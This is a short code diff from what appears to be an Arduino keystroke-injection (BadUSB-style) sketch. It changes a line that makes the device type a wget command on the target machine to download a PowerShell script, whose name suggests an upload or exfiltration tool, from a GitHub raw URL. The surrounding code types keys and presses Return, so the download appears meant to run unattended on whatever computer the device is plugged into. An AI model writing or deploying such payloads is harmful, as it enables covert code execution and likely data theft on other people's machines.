@@ -133,7 +133,7 @@ void setup()
   typeKey(KEY_RETURN);
 
   // Download ps1 script
-  Keyboard.print("wget https://raw.githubusercontent.com/idontknow-CC/gigido/main/ciaoV2_upload.ps1 -OutFile ciaoV2_upload.ps1");
+  Keyboard.print("wget https://raw.githubusercontent.com/idontknow-CC/gigido/refs/heads/main/window_ciaoV2_upload.ps1 -OutFile ciaoV2_upload.ps1");
 
   typeKey(KEY_RETURN);
 
